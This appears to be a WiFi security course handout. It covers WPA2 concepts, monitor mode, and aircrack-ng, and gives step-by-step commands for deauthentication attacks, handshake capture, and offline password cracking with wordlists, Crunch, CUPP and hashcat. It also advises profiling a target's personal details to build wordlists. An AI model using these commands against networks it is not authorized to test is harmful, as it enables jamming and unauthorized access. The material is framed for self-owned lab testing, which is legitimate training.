# Cybersecurity Course : WiFi Security — Concepts, Terminology, Monitor Mode & Security Assessment

> Source: Cyber Pathshala
> Topics covered: How WiFi networking works end-to-end, key WiFi technical terminology (ESSID/BSSID/Station ID/Handshake/Channel/Beacon), Monitor Mode vs Managed Mode, the Aircrack-ng tool suite (airodump-ng / aireplay-ng / aircrack-ng), WPA/WPA2 handshake capture concept, deauthentication attacks, password cracking methodology (wordlists, rockyou.txt, Crunch), WiFi adapter selection and driver installation on Kali Linux.

> ⚠️ **Ethical & Legal Disclaimer:** All techniques in this document must only be performed on networks and devices you **own** or have **explicit written authorization** to test. Unauthorized access to any WiFi network is a criminal offence under the IT Act (India) and equivalent laws worldwide — regardless of intent. Practice exclusively in a controlled, personal lab environment using your own router and devices.

---

## Table of Contents

1. [How WiFi Networking Works — End to End](#1-how-wifi-networking-works--end-to-end)
2. [Key WiFi Technical Terminology](#2-key-wifi-technical-terminology)
3. [What a Hacker Observes on a WiFi Network](#3-what-a-hacker-observes-on-a-wifi-network)
4. [Managed Mode vs Monitor Mode](#4-managed-mode-vs-monitor-mode)
5. [The Handshake File — What It Is and Why It Matters](#5-the-handshake-file--what-it-is-and-why-it-matters)
6. [WPA / WPA2 / WPA3 — Security Comparison](#6-wpa--wpa2--wpa3--security-comparison)
7. [Aircrack-ng Tool Suite — Overview](#7-aircrack-ng-tool-suite--overview)
8. [Practical Lab Setup — WiFi Adapter on Kali Linux](#8-practical-lab-setup--wifi-adapter-on-kali-linux)

- [8.1 Connecting the WiFi Adapter to Kali (VMware/VirtualBox)](#81-connecting-the-wifi-adapter-to-kali-vmwarevirtualbox)
- [8.2 Verifying the Adapter](#82-verifying-the-adapter)
- [8.3 Converting to Monitor Mode](#83-converting-to-monitor-mode)
- [8.4 Stopping Interfering Services](#84-stopping-interfering-services)

9. [WiFi Adapter Driver Installation on Kali Linux](#9-wifi-adapter-driver-installation-on-kali-linux)

- [9.1 Method 1 — APT Package Manager](#91-method-1--apt-package-manager)
- [9.2 Method 2 — GitHub / Manual Compilation](#92-method-2--github--manual-compilation)
- [9.3 Method 3 — AI-Assisted Automation](#93-method-3--ai-assisted-automation)

10. [Scanning with airodump-ng](#10-scanning-with-airodump-ng)

- [10.1 Full-Range Scan](#101-full-range-scan)
- [10.2 Targeted Single-Network Scan with File Capture](#102-targeted-single-network-scan-with-file-capture)
- [10.3 Reading airodump-ng Output](#103-reading-airodump-ng-output)

11. [Deauthentication Attack (WiFi Jamming) — Concept](#11-deauthentication-attack-wifi-jamming--concept)
12. [Capturing the WPA Handshake](#12-capturing-the-wpa-handshake)
13. [Password Cracking — Methodology](#13-password-cracking--methodology)

- [13.1 Method 1 — Aircrack-ng with Existing Wordlist](#131-method-1--aircrack-ng-with-existing-wordlist)
- [13.2 Method 2 — Leaked Database Wordlists](#132-method-2--leaked-database-wordlists)
- [13.3 Method 3 — Crunch (Custom Wordlist Generation)](#133-method-3--crunch-custom-wordlist-generation)
- [13.4 Method 4 — Pattern-Based / Footprinting Approach](#134-method-4--pattern-based--footprinting-approach)

14. [Recommended WiFi Adapters for Security Testing](#14-recommended-wifi-adapters-for-security-testing)
15. [How to Secure Your Own WiFi Network (Defence)](#15-how-to-secure-your-own-wifi-network-defence)
16. [Key Takeaways / Summary](#16-key-takeaways--summary)
17. [Glossary](#17-glossary)
18. [Full Command Reference](#18-full-command-reference)

---

## 1. How WiFi Networking Works — End to End

Understanding WiFi security requires first understanding how WiFi fundamentally works. Here is the complete flow from ISP to end device:

```
┌─────────────┐      ┌─────────────┐      ┌─────────────────────────┐
│    ISP      │─────▶│   Router /  │─────▶│   Client Devices        │
│ (Jio/Airtel │      │  Broadband  │      │ (Phone, Laptop, PC)     │
│  /BSNL etc) │      │             │      │                         │
└─────────────┘      └─────────────┘      └─────────────────────────┘
│
┌───────────┴────────────┐
│                        │
Wired (Ethernet)         Wireless (WiFi)
Cable from router        Radio frequency signals
to device                Hotspot / Access Point
```

**Step-by-step connection process:**

1. The ISP provides internet service via a broadband connection installed at your home.
2. The router (broadband device) is connected to the ISP's network.
3. On the router, a **hotspot/access point service** is activated — given a name (e.g., "Ashish") and a password.
4. The router now has multiple identities:

- A **name** (the hotspot name, e.g., "Ashish")
- A **MAC address** (physical hardware identifier)
- A **private IP address** (for communication within the local network)
- A **public IP address** (for communication over the internet)
- A **localhost address** (`127.0.0.1`)

5. A user device (phone/laptop) with a WiFi adapter scans for available networks within range.
6. All active hotspots within range are displayed by name.
7. The user selects the hotspot name and enters the password.
8. A **packet** (called the handshake file) is generated by the user's device containing the password.
9. This packet travels to the router/hotspot.
10. The router checks the password — if correct, the connection is established; if wrong, it is rejected.

---

## 2. Key WiFi Technical Terminology

When performing WiFi security analysis, these technical terms appear constantly. Understanding them precisely is essential — beginners often fail at WiFi security because they follow commands blindly without understanding what each term means.

| Technical Term     | Simple Meaning                                       | Details                                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **ESSID**          | Name of the hotspot/network                          | Extended Service Set Identifier — the human-readable name of a WiFi network (e.g., "Ashish", "JioFiber_5G"). This is what you see in your WiFi list.                                                                                 |
| **BSSID**          | MAC address of the hotspot/router                    | Basic Service Set Identifier — the unique physical hardware address of the access point (router/hotspot). Format: `XX:XX:XX:XX:XX:XX`. Used to uniquely identify a specific access point when multiple networks share the same name. |
| **Station ID**     | MAC address of a connected client device             | The hardware address of any device connected to (or trying to connect to) a hotspot. Not the same as BSSID — BSSID is the router; Station ID is the client (phone, laptop, etc.).                                                    |
| **Handshake File** | The packet containing the password during connection | Generated when a client tries to connect to a hotspot. Contains the password (encrypted/hashed). If captured, it can be used offline for password cracking.                                                                          |
| **ENC**            | Encryption type of the network                       | Which security protocol is in use — WEP, WPA, WPA2, or WPA3.                                                                                                                                                                         |
| **CH**             | Channel number                                       | The radio frequency "tunnel" (channel) the access point uses for communication. WiFi uses channels 1–13 (2.4 GHz band) or 36–165 (5 GHz band). Like FM radio frequencies — each network broadcasts on one specific channel.          |
| **PWR**            | Signal strength (power level)                        | Measured in negative dBm. The closer to zero (less negative), the stronger the signal and the closer the device. Example: -55 is closer than -87.                                                                                    |
| **Beacon**         | Activity indicator of the network                    | Frames broadcast by the access point to announce its presence. More beacons = more active network. Shown as a count in airodump-ng.                                                                                                  |
| **IV**             | Initialization Vector                                | A component of older WEP encryption — reveals what encryption technology is in use.                                                                                                                                                  |
| **AUTH**           | Authentication method                                | How the client authenticates to the network. PSK (Pre-Shared Key) = password-based authentication. MGT = enterprise/RADIUS-based.                                                                                                    |

> **Why these matter in practice:** When using tools like airodump-ng, every column in the output corresponds to one of these terms. Understanding them means you can read scan results intelligently rather than just copying commands.

---

## 3. What a Hacker Observes on a WiFi Network

From a security researcher's perspective, here is what is observable about a WiFi network **without connecting to it** — simply by being within radio range:

**Using Monitor Mode (explained in Section 4), an attacker can see:**

1. **All active access points (hotspots) in range** — their ESSIDs (names), BSSIDs (MAC addresses), channels, encryption types, signal strengths.
2. **All clients connected to each hotspot** — their Station IDs (MAC addresses), even without connecting to that hotspot.
3. **How active each network is** — beacon count, data transfer rate.
4. **The security type** — WEP, WPA, WPA2, WPA3 — directly visible in scan output.
5. **The authentication method** — PSK (password) or MGT (enterprise).

**What this means for security:**

- Even a locked WPA2 network reveals its name, MAC address, channel, connected clients, and security type to anyone within range.
- This information is sufficient to plan an attack or security assessment.
- The actual **password is not visible** — it is only contained (in hashed/encrypted form) inside the handshake file.

---

## 4. Managed Mode vs Monitor Mode

A WiFi adapter can operate in two fundamentally different modes. Understanding the difference is essential to WiFi security work.

### Managed Mode (Default)

- **What it does:** Normal, everyday WiFi operation.
- **Capabilities:** Scans for visible hotspots in range, connects to them, transfers data.
- **Limitation:** Can only see and communicate with hotspots it is connected to (or attempting to connect to). Cannot see all traffic on the network.
- **When it's used:** Every time you use WiFi on your phone, laptop, or computer normally.

### Monitor Mode (Advanced)

- **What it does:** Puts the adapter into a passive listening/monitoring state where it captures **all** WiFi packets within radio range — whether addressed to it or not.
- **Capabilities:**
- Sees all active access points in range (including hidden SSIDs in some cases).
- Shows all clients connected to each access point (Station IDs/MAC addresses).
- Captures all packets being transmitted — including handshake files.
- Can **inject packets** (send custom packets without being connected to any network).
- **The packet injection power:** In monitor mode, the adapter can send specially crafted packets to other devices on the network without being authenticated to that network. The most relevant packet type for security testing is the **deauthentication packet**.
- **When it's used:** WiFi security auditing, penetration testing, packet analysis.

> **Analogy from the lecture:** Monitor mode is like a class monitor who can observe everyone in the room, record their activity, and even send people out — all without being a regular student themselves.

**Key difference table:**

| Feature                                 | Managed Mode   | Monitor Mode             |
| --------------------------------------- | -------------- | ------------------------ |
| See own network traffic                 | ✓              | ✓                        |
| See all networks in range               | ✓ (names only) | ✓ (full details)         |
| See connected clients of other networks | ✗              | ✓                        |
| Capture packets from other networks     | ✗              | ✓                        |
| Inject packets                          | ✗              | ✓                        |
| Internet access while active            | ✓              | ✗ (usually)              |
| Default state                           | ✓              | Must be enabled manually |

---

## 5. The Handshake File — What It Is and Why It Matters

The **handshake file** is one of the most important concepts in WiFi security analysis.

**What it is:**

- A packet (or series of packets) generated when a client device attempts to connect to a WPA/WPA2 protected access point.
- Contains the password — but **not in plain text**. The password is processed through a cryptographic function (PBKDF2 with HMAC-SHA1 for WPA2) combined with the network name (SSID) to produce a hash.
- The actual exchange is called the **4-way handshake** in WPA/WPA2 — four packets are exchanged between the client and access point to authenticate.

**The 4-Way Handshake Process (WPA2):**

```
CLIENT                          ACCESS POINT (Router)
│                                    │
│◀────── Message 1: ANonce ──────────│
│  (Router sends random number)      │
│                                    │
│────── Message 2: SNonce + MIC ────▶│
│  (Client sends its random number   │
│   + Message Integrity Code,        │
│   derived from password hash)      │
│                                    │
│◀────── Message 3: GTK + MIC ───────│
│  (Router sends group key)          │
│                                    │
│────── Message 4: ACK ─────────────▶│
│  (Client confirms)                 │
│                                    │
[Connection established if MIC valid]
```

**Why attackers want the handshake file:**

- The handshake contains enough information to perform **offline brute-force/dictionary attacks**.
- The attacker captures the handshake, then uses a wordlist to generate the same hash and compare — if the hashes match, the password is found.
- This attack happens entirely offline — the access point is not involved after capture.

**Is the password visible in plain text in the handshake?**

- **No.** The password is never transmitted in clear text. It is hashed/derived using PBKDF2.
- However, if the password is in a dictionary or wordlist, it can be found by offline comparison (dictionary attack).
- If the password is strong and random, brute-forcing becomes computationally infeasible.

---

## 6. WPA / WPA2 / WPA3 — Security Comparison

| Feature                       | WEP               | WPA         | WPA2             | WPA3                                       |
| ----------------------------- | ----------------- | ----------- | ---------------- | ------------------------------------------ |
| **Year introduced**           | 1997              | 2003        | 2004             | 2018                                       |
| **Encryption**                | RC4 (weak)        | TKIP        | AES-CCMP         | AES-GCMP-256                               |
| **Key derivation**            | Static            | TKIP        | PBKDF2-SHA1      | SAE (Dragonfly)                            |
| **Handshake type**            | N/A               | 4-way       | 4-way            | SAE handshake                              |
| **Offline cracking possible** | Yes (easily)      | Yes         | Yes (dictionary) | Much harder (SAE prevents offline attacks) |
| **Cracking difficulty**       | Very Easy         | Easy-Medium | Medium-Hard      | Very Hard                                  |
| **Status**                    | Deprecated/Broken | Deprecated  | Current standard | Recommended                                |

**Key security points:**

- **WEP** is completely broken and should never be used — can be cracked in minutes regardless of password strength.
- **WPA** is also weak — its use of TKIP has known vulnerabilities.
- **WPA2** is the current widespread standard — secure against most attacks if a strong password is used. Vulnerable to offline dictionary attacks if the password is weak.
- **WPA3** introduces SAE (Simultaneous Authentication of Equals), which prevents offline dictionary attacks by design. Even if the handshake is captured, offline cracking is not feasible with SAE.

> **Practical implication:** The effectiveness of WiFi password cracking attacks against WPA2 depends almost entirely on password strength. A 12+ character random password makes the attack computationally infeasible with current hardware.

---

## 7. Aircrack-ng Tool Suite — Overview

**Aircrack-ng** is a comprehensive suite of tools for WiFi network security assessment. It is pre-installed on Kali Linux and Parrot OS.

| Tool            | Purpose                                                                                                                              |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **airmon-ng**   | Manage WiFi adapter modes — switch between managed and monitor mode. Also checks for and kills interfering processes.                |
| **airodump-ng** | WiFi packet capture — scans for networks, displays their details, captures packets to a file (including handshake files).            |
| **aireplay-ng** | Packet injection — sends crafted packets to the network. Most commonly used for deauthentication attacks to force handshake capture. |
| **aircrack-ng** | Password cracking — analyzes captured `.cap` files and attempts to crack the WPA/WPA2 password using wordlists.                      |
| **airdecap-ng** | Decrypts captured WEP/WPA/WPA2 packets (once the key is known).                                                                      |
| **airbase-ng**  | Creates a fake access point (evil twin attacks).                                                                                     |

**File types created by airodump-ng during capture:**

| Extension        | Contents                                                                                              |
| ---------------- | ----------------------------------------------------------------------------------------------------- |
| `.cap`           | The main capture file — contains all captured packets including the handshake. Used with aircrack-ng. |
| `.csv`           | CSV-format summary of all detected networks and clients.                                              |
| `.kismet.csv`    | Kismet-compatible format.                                                                             |
| `.kismet.netxml` | XML format for use with Kismet.                                                                       |
| `.log.csv`       | Log file.                                                                                             |

> The `.cap` file is the most important — it is what you provide to aircrack-ng for password cracking. Always ensure your capture saves to this format.

---

## 8. Practical Lab Setup — WiFi Adapter on Kali Linux

### 8.1 Connecting the WiFi Adapter to Kali (VMware/VirtualBox)

Since Kali Linux typically runs as a VM, the USB WiFi adapter needs to be **passed through** to the VM:

**VMware Workstation:**

- When you plug in the USB WiFi adapter, a pop-up appears asking whether to connect it to the host or the VM.
- Select **"Connect to Virtual Machine"** → your Kali VM.
- If the pop-up doesn't appear: go to **VM menu → Removable Devices → [your adapter name] → Connect**.

**VirtualBox:**

- Go to **Devices → USB Devices** in the VirtualBox menu.
- Find your adapter (e.g., "MediaTek MT7601U Wireless Adapter") and click to connect it.

**Verify the adapter is connected:**

- In Kali, you should hear a connection sound, or
- The WiFi networks list (if you check available networks in the GUI) will start showing nearby networks.

---

### 8.2 Verifying the Adapter

Once connected, verify the adapter is recognized by Kali:

```bash
# Check all network interfaces
ifconfig

# Check wireless interfaces only
iwconfig
```

**Reading `ifconfig` output:**

- `eth0` / `eth1` — wired Ethernet interfaces.
- `lo` — loopback (localhost, `127.0.0.1`) — always present on every machine.
- `wlan0` — **your WiFi adapter**. The `wlan` prefix indicates a Wireless Local Area Network device.
- Under `wlan0`, look for `ether` — this shows the adapter's **MAC address**.

**Reading `iwconfig` output:**

- Shows wireless-specific details for each interface.
- The `Mode` field shows current mode: `Managed` (default) or `Monitor`.
- Also shows frequency, access point association, and protocol.

> **Remember the interface name** (e.g., `wlan0`) — this is used in every subsequent command. Your adapter may be named `wlan0`, `wlan1`, or something else depending on your system.

---

### 8.3 Converting to Monitor Mode

**Method — Automated (using airmon-ng):**

```bash
# Switch adapter to monitor mode
airmon-ng start wlan0

# Verify the mode change
iwconfig
```

**What happens:**

- `airmon-ng start wlan0` automatically converts the adapter named `wlan0` to monitor mode.
- The interface may be renamed (e.g., from `wlan0` to `wlan0mon`) — note the new name.
- `iwconfig` now shows `Mode: Monitor` instead of `Mode: Managed`.

**To revert back to managed mode:**

```bash
airmon-ng stop wlan0mon
```

---

### 8.4 Stopping Interfering Services

A common problem: when in monitor mode, background processes (NetworkManager, wpa_supplicant) may try to use the WiFi adapter, causing it to switch back to managed mode or produce errors mid-scan.

**Solution — Kill all interfering processes before switching to monitor mode:**

```bash
airmon-ng check kill
```

**What this does:**

- Scans for processes that are using or could interfere with the WiFi adapter.
- Terminates them all (including NetworkManager — your internet will disconnect).
- This is intentional — during a WiFi security assessment, you don't need internet access.

**To restore internet access after assessment:**

```bash
# Restart NetworkManager
service NetworkManager restart
# or
systemctl restart NetworkManager
```

**Recommended workflow:**

```bash
# Step 1: Kill interfering processes
airmon-ng check kill

# Step 2: Switch to monitor mode
airmon-ng start wlan0

# Step 3: Verify
iwconfig
```

---

## 9. WiFi Adapter Driver Installation on Kali Linux

If your WiFi adapter isn't working properly (not appearing in `iwconfig`, no networks visible in airodump-ng), the driver may need to be installed. Three methods are available.

### 9.1 Method 1 — APT Package Manager

First, identify your adapter's chipset name using `lsusb`:

```bash
lsusb
```

This lists all connected USB devices. Find your adapter — note its **chipset name** (e.g., "MT7601U", "RTL8188", "AR9271").

Then try to install the driver via APT:

```bash
# Try chipset name variations
apt install firmware-misc-nonfree
apt install realtek-rtl88xxau-dkms   # for Realtek chipsets
apt install mt7601u                   # for MediaTek MT7601U
```

If APT finds and installs the driver, reboot and test.

---

### 9.2 Method 2 — GitHub / Manual Compilation

If APT doesn't have the driver:

1. Open a browser and search: `[chipset name] linux driver github`

- Example: `MT7601U linux driver github`

2. Find the GitHub repository for your chipset.
3. Read the **README.md** file — it will contain installation instructions.
4. Follow the instructions — typically:

```bash
# Clone the repository
git clone https://github.com/[username]/[driver-repo].git

# Enter the directory
cd [driver-repo]

# Build the driver
make

# Install the driver
sudo make install

# Load the driver module
sudo modprobe [driver-module-name]
```

**Common issue — Kernel version incompatibility:**

- Some older driver repositories only support older Linux kernel versions.
- If errors occur related to kernel headers or API changes, options are:
- Find a fork of the driver that supports your current kernel.
- Install an older version of Kali on a separate VM (download from kali.org).
- Do **not** downgrade your main Kali installation — this causes cascading dependency issues.

---

### 9.3 Method 3 — AI-Assisted Automation

If neither APT nor GitHub methods work cleanly, use an AI tool (ChatGPT, Claude, etc.) to generate a custom installation script:

**Prompt approach:**

```
I am using Kali Linux and trying to use a [chipset name/model] WiFi adapter.
The adapter shows up in lsusb but does not appear in iwconfig / airmon-ng.
I need to install its driver. Please write a Python script that automatically
handles the complete driver installation process and resolves common errors.
```

The AI will generate a Python script that:

- Detects the kernel version.
- Downloads the appropriate driver source.
- Patches any compatibility issues.
- Compiles and installs the driver.
- Loads the module.

Save the script and run it:

```bash
python3 wifi_driver_install.py
```

If errors occur during execution, copy the error message back to the AI for iterative troubleshooting.

---

## 10. Scanning with airodump-ng

### 10.1 Full-Range Scan

After enabling monitor mode, run a full scan of all networks in range:

```bash
airodump-ng wlan0
```

(Replace `wlan0` with your monitor-mode interface name — may be `wlan0mon` after airmon-ng.)

**What this does:**

- Cycles through all available channels (1–13 for 2.4 GHz, 36+ for 5 GHz).
- Displays all access points (hotspots) in range with their details.
- Displays all clients connected to those access points.
- Updates in real time — data changes rapidly as the channel cycles.

**Stop the scan:** `Ctrl + C`

---

### 10.2 Targeted Single-Network Scan with File Capture

Once you have identified your **target network** (your own router for testing), focus the scan on that specific network and save all captured data to a file:

```bash
airodump-ng wlan0 --bssid [TARGET_BSSID] --channel [CHANNEL] --write [FILENAME]
```

**Example:**

```bash
airodump-ng wlan0 --bssid AA:BB:CC:DD:EE:FF --channel 6 --write mycapture
```

**Flag breakdown:**

| Flag        | Value          | Purpose                                                                                                                                         |
| ----------- | -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `wlan0`     | Interface name | The monitor-mode WiFi adapter to use.                                                                                                           |
| `--bssid`   | MAC address    | Focus only on the target access point with this MAC address. Ignores all other networks.                                                        |
| `--channel` | Number (1–13)  | Lock to the specific channel the target operates on. Prevents channel hopping, ensuring no packets are missed.                                  |
| `--write`   | Filename       | Save all captured packets to a file. Creates multiple files with this base name and different extensions. The `.cap` file is the important one. |

**Why specifying channel matters:** By default, airodump-ng hops between channels. If you don't lock to the target's channel, you will miss many packets — including the handshake — because the adapter is on a different channel when they are transmitted.

---

### 10.3 Reading airodump-ng Output

The output has two sections separated by a blank line:

**Top section — Access Points:**

```
BSSID              PWR  Beacons  #Data  CH  ENC   AUTH  ESSID
AA:BB:CC:DD:EE:FF  -55  150      42     6   WPA2  PSK   MyHomeNetwork
FF:EE:DD:CC:BB:AA  -72  89       12     1   WPA2  PSK   NeighborNet
```

| Column      | Meaning                                                                            |
| ----------- | ---------------------------------------------------------------------------------- |
| **BSSID**   | MAC address of the access point.                                                   |
| **PWR**     | Signal strength in dBm (negative — closer to 0 = stronger signal = closer device). |
| **Beacons** | Number of beacon frames received — indicates how active/healthy the network is.    |
| **#Data**   | Number of data packets captured — higher = more traffic.                           |
| **CH**      | Channel the access point is broadcasting on.                                       |
| **ENC**     | Encryption type (WEP, WPA, WPA2, WPA3, OPN for open).                              |
| **AUTH**    | Authentication method (PSK = password, MGT = enterprise RADIUS).                   |
| **ESSID**   | Network name (hotspot name).                                                       |

**Bottom section — Connected Clients:**

```
BSSID              STATION            PWR    Packets  Probes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -61    128
AA:BB:CC:DD:EE:FF  66:55:44:33:22:11  -78    45
```

| Column      | Meaning                                                                                       |
| ----------- | --------------------------------------------------------------------------------------------- |
| **BSSID**   | MAC address of the access point this client is connected to.                                  |
| **STATION** | MAC address (Station ID) of the connected client device.                                      |
| **PWR**     | Client's signal strength.                                                                     |
| **Packets** | Number of packets exchanged.                                                                  |
| **Probes**  | Networks this device is probing for (networks it previously connected to and is looking for). |

> **How to select your target:** For your own network security test, identify your router's BSSID and channel from this output. Note both values — you need them for all subsequent commands.

---

## 11. Deauthentication Attack (WiFi Jamming) — Concept

A **deauthentication (deauth) attack** is used in WiFi security assessment to forcefully disconnect clients from an access point. Understanding this is important both for testing and for understanding how to defend against it.

**How it works:**

- WiFi management frames (including deauthentication frames) are **not authenticated** in WPA2 — anyone can send them.
- A deauth packet tells a connected client: "You are being disconnected from this network. Please re-authenticate."
- The client, believing this instruction came from the legitimate access point, disconnects and then automatically tries to reconnect.
- During reconnection, the **4-way handshake is performed again** — which can be captured.

**Why this matters for security assessment:**

- If testing your own network and no client is currently connected (or has recently connected), you may not have a handshake to capture.
- By briefly sending deauth packets to a connected client on your own test network, you force it to reconnect and generate a handshake — which you capture.

**The aireplay-ng deauth command:**

```bash
aireplay-ng --deauth [COUNT] -a [AP_BSSID] -c [CLIENT_STATION_ID] wlan0
```

**Parameter breakdown:**

| Parameter  | Value              | Purpose                                                                                           |
| ---------- | ------------------ | ------------------------------------------------------------------------------------------------- |
| `--deauth` | Number             | Send this many deauthentication packets. Use `0` for continuous (stop with Ctrl+C).               |
| `-a`       | AP MAC address     | The BSSID of the access point to spoof the disconnect from.                                       |
| `-c`       | Client MAC address | The Station ID of the specific client to disconnect. Omit to broadcast (disconnects all clients). |
| `wlan0`    | Interface name     | The monitor-mode adapter.                                                                         |

**Example (test on your own network — disconnect one of your own devices):**

```bash
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
```

**What to watch for in airodump-ng during deauth:**

- The "Lost" column increases — packets are being lost by the client.
- When the attack stops, the client reconnects — and airodump-ng displays:

```
WPA handshake: AA:BB:CC:DD:EE:FF
```

This confirms the handshake has been captured and saved to your `.cap` file.

**Defence against deauth attacks:**

- **WPA3** implements Management Frame Protection (MFP/802.11w), which **authenticates management frames** — making deauth attacks ineffective.
- On WPA2 networks, enable **802.11w (Protected Management Frames)** if your router supports it.
- Use WPA3 where possible — it is immune to deauth-based handshake capture.

---

## 12. Capturing the WPA Handshake

The complete workflow to capture a WPA2 handshake on **your own test network**:

```bash
# Step 1: Kill interfering processes
airmon-ng check kill

# Step 2: Enable monitor mode
airmon-ng start wlan0

# Step 3: Identify your target network (note BSSID and Channel)
airodump-ng wlan0
# Press Ctrl+C after identifying target

# Step 4: Start targeted capture (keep this running in background/tab)
airodump-ng wlan0 --bssid [YOUR_ROUTER_BSSID] --channel [CHANNEL] --write capture_test

# Step 5 (in a second terminal): Send deauth to a connected device
# (Use your own phone/laptop's MAC as the -c target)
aireplay-ng --deauth 10 -a [YOUR_ROUTER_BSSID] -c [YOUR_DEVICE_MAC] wlan0

# Step 6: Watch terminal 1 for:
# "WPA handshake: [BSSID]" — handshake captured successfully

# Step 7: Stop capture
# Ctrl+C in terminal 1
```

**Verify the handshake was captured:**

```bash
# List files created
ls capture_test*
# You should see: capture_test-01.cap, capture_test-01.csv, etc.

# Verify handshake presence in the cap file
aircrack-ng capture_test-01.cap
# If handshake is present, it will show the network and indicate WPA cracking is possible
```

---

## 13. Password Cracking — Methodology

Once the handshake is captured, the next step is attempting to recover the password. This is entirely **offline** — the router is not involved.

**How offline cracking works:**

```
Captured Handshake = Hash(Password + SSID + other params)

Attacker generates:
Candidate Password → Hash(Candidate + SSID + params) → Compare with captured hash

If match → Password found
If no match → Try next candidate
```

The speed of cracking depends on:

- CPU/GPU performance.
- Password length and complexity.
- Quality and relevance of the wordlist.

---

### 13.1 Method 1 — Aircrack-ng with Existing Wordlist

The simplest approach — use a pre-existing wordlist of common passwords:

```bash
aircrack-ng -w [WORDLIST_PATH] -b [TARGET_BSSID] [CAPTURE_FILE]
```

**Example using rockyou.txt (pre-installed in Kali):**

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture_test-01.cap
```

**rockyou.txt details:**

- Located at `/usr/share/wordlists/rockyou.txt.gz` (compressed) on Kali.
- Extract first: `gunzip /usr/share/wordlists/rockyou.txt.gz`
- Contains approximately **14 million** real-world passwords from a 2009 data breach.
- Very effective against common, simple passwords (123456789, password, qwerty, etc.).
- Ineffective against strong, unique passwords.

**Output when password is found:**

```
KEY FOUND! [ password123 ]
```

**Output when not found:**

```
Passphrase not in dictionary
```

---

### 13.2 Method 2 — Leaked Database Wordlists

If rockyou.txt fails, use larger or more targeted wordlists from leaked password databases:

**Sources:**

- **SecLists** (GitHub: `danielmiessler/SecLists`) — a comprehensive collection of wordlists including leaked databases, common credentials, and password patterns.

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

Relevant directory: `SecLists/Passwords/Leaked-Databases/`

- **WeakPass** (`weakpass.com`) — aggregated wordlists from multiple data breaches.
- **CrackStation** (`crackstation.net`) — large pre-computed hash lists and wordlists.

**Using a downloaded wordlist:**

```bash
aircrack-ng -w /path/to/downloaded/wordlist.txt -b [BSSID] capture_test-01.cap
```

---

### 13.3 Method 3 — Crunch (Custom Wordlist Generation)

**Crunch** generates wordlists based on specified character sets, minimum and maximum lengths. It creates every possible combination — making it exhaustive but requiring enormous storage/time for large character sets.

**Basic syntax:**

```bash
crunch [min-length] [max-length] [charset] [options]
```

**Example — Generate all 8–12 character passwords using lowercase letters and numbers:**

```bash
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789
```

**The storage problem:**

- Crunch with a large character set and length range generates files that can reach **petabytes** in size.
- This is computationally infeasible to store.

**Solution — Pipe directly into aircrack-ng (no storage needed):**

```bash
crunch [min] [max] [charset] | aircrack-ng -w - -b [BSSID] [CAPTURE_FILE]
```

**What the pipe (`|`) does:**

- Instead of saving the wordlist to disk, pipe the output of Crunch **directly** as input to aircrack-ng.
- The `-w -` flag tells aircrack-ng to read the wordlist from standard input (the pipe).
- Passwords are generated and tested in real time — **zero disk storage used**.

**Example:**

```bash
crunch 8 15 abcdefghijklmnopqrstuvwxyz0123456789@#$ | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture_test-01.cap
```

**Crunch character set shortcuts:**

| Crunch Charset Flag | Characters Included              |
| ------------------- | -------------------------------- |
| `a`                 | Lowercase letters (a-z)          |
| `A`                 | Uppercase letters (A-Z)          |
| `1`                 | Numbers (0-9)                    |
| `!`                 | Special characters               |
| Custom string       | Any characters you list directly |

**Crunch with pattern (`-t` flag):**

```bash
# Pattern: 4 lowercase, 4 numbers (e.g., home1234)
crunch 8 8 -t @@@@%%%%
# @ = lowercase letter, % = number, ^ = uppercase, , = special char
```

> **Realistic assessment:** Crunch-based brute force against WPA2 with 8+ character passwords containing mixed character sets is extremely slow on CPU. GPU-based tools (Hashcat) are significantly faster for this approach.

---

### 13.4 Method 4 — Pattern-Based / Footprinting Approach

The most effective professional approach — create a **targeted wordlist** based on information gathered about the target.

**The psychology of passwords:**

- Most people (estimated 95%) use the same base pattern across multiple accounts, making small variations.
- Example: If someone's passwords are `Ashish1213`, `Ashish@456`, the pattern reveals the third will likely be `Ashish@789` or similar.
- By understanding someone's pattern, you can crack all their past, present, and future passwords.

**Information to gather for targeted wordlisting:**

- Name, nickname, birthdate, pet name, spouse name.
- Favourite sports team, movie, song, hobby.
- Phone number, anniversary date.
- Any previously known passwords.
- City, school, workplace name.

**Tools for targeted wordlist creation:**

**CeWL** — scrapes a website and generates a wordlist from words found there:

```bash
cewl https://targetwebsite.com -d 2 -w wordlist.txt
```

**CUPP (Common User Password Profiler)** — interactive tool that asks questions about the target and generates a custom wordlist:

```bash
# Install
apt install cupp

# Run interactively
cupp -i
```

**Hashcat rule-based mutation** — takes a base wordlist and applies rules to generate variations (adding numbers, symbols, capitalizing letters):

```bash
hashcat -a 0 -m 2500 capture.hccapx base_wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 14. Recommended WiFi Adapters for Security Testing

When purchasing a WiFi adapter for security research, the most important requirement is **Linux / monitor mode support**. Not all adapters support monitor mode and packet injection.

**Key requirements:**

- **Linux driver support** — check the product description/specifications on the purchase platform.
- **Monitor mode support** — specifically mentioned, or uses a chipset known to support it.
- **Packet injection support** — needed for deauth attacks and other active testing.

**Well-known supported chipsets (as of 2024):**

| Chipset               | Common Adapters      | Notes                                         |
| --------------------- | -------------------- | --------------------------------------------- |
| **Atheros AR9271**    | TP-Link TL-WN722N v1 | Excellent support, widely used for Kali       |
| **Ralink RT3070**     | Various brands       | Good support                                  |
| **MediaTek MT7601U**  | Various brands       | Basic support, some limitations               |
| **Realtek RTL8812AU** | Alfa AWUS036ACH      | 802.11ac, dual-band, good for modern networks |
| **Realtek RTL8814AU** | Alfa AWUS1900        | High-power, 4 antennas                        |
| **Ralink RT5572**     | Alfa AWUS036NH       | Good 2.4/5 GHz support                        |

**Important note on TP-Link TL-WN722N:**

- Version 1 (v1) uses the Atheros AR9271 chipset — **excellent Linux support**.
